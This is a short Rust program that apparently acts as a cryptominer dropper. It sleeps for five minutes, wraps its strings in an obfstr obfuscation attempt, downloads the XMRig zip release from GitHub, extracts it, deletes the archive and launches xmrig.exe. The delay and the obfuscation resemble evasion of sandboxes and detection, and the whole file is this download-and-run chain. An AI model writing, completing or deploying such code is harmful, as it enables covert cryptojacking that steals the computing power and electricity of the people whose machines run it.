use std::fs::File;
use std::io::copy;
use std::fs;
use zip::ZipArchive;
use std::thread::sleep;
use std::time::Duration;
use std::env;
use obfstr::obfstr;
use std::process::Command;
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // URL to download the file from
    sleep(Duration::from_secs(300));
    const URL: &str = "https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-gcc-win64.zip";
    assert_eq!(obfstr!(URL), URL);
    const PATH: &str ="downloaded_file//xmrig-6.21.1";
    assert_eq!(obfstr!(PATH), PATH);
    const MINER: &str = "xmrig.exe";
    assert_eq!(obfstr!(MINER), MINER);
    // Send a GET request to the URL
    let response = reqwest::get(URL).await?;
    // Ensure the request was successful
    assert!(response.status().is_success());
    
    // Open a file where the contents will be saved
    let mut dest = File::create("downloaded_file.zip")?;
    
    // Copy the contents of the response body to the file
    let content = response.bytes().await?;
    copy(&mut content.as_ref(), &mut dest)?;
    //unzip the file
    // Unzip the file
    let file = File::open("downloaded_file.zip")?;
    let mut archive = ZipArchive::new(file)?;
    archive.extract("downloaded_file")?;
    //temp until verifying is the folder that contains the new blocks to be verified
    //REMOVE THE ZIP FILE
    fs::remove_file("downloaded_file.zip")?;
    env::set_current_dir(&PATH)?;
    let current = env::current_dir()?;
    println!("Current directory: {:?}", current); 
    //run the miner
    println!("Running the miner {}", MINER);
    let full_path = format!("{}\\{}", current.display(), MINER);
    println!("Full path: {}", full_path);
    let _: std::process::Output = Command::new(full_path)
        .output()
        .expect("failed to execute process");
    println!("File has been downloaded.");

    Ok(())
}

